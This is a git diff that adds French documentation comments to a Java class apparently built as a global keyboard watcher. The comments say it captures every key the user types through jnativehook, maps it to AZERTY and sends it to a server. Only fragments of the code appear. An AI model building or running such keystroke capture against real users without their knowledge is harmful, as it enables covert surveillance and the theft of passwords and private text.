@@ -9,6 +9,9 @@ import org.jnativehook.keyboard.NativeKeyListener;
 
 import Controller.Main;
 
+/**
+ * Envoie chaque touche entrée par l'utilisateur au serveur
+ */
 public class KeyListenerWatcher extends Watcher 
 {
 	static String TYPE = "KEYBOARD";
@@ -20,6 +23,10 @@ public class KeyListenerWatcher extends Watcher
 
 	public class GlobalKeyListener implements NativeKeyListener 
 	{
+		/**
+		 * Récupère la touche entrée par l'utilisateur et la traduit,
+		 * si nécessaire, en clavier AZERTY
+		 */
 		public void nativeKeyPressed(NativeKeyEvent e) {	
 
 			String information = azerty(e.getKeyCode());
@@ -33,6 +40,9 @@ public class KeyListenerWatcher extends Watcher
 		}
 	}
 
+	/**
+	 * Enclenche la surveillance des touches entrées
+	 */
 	public void run()
 	{
 		try {
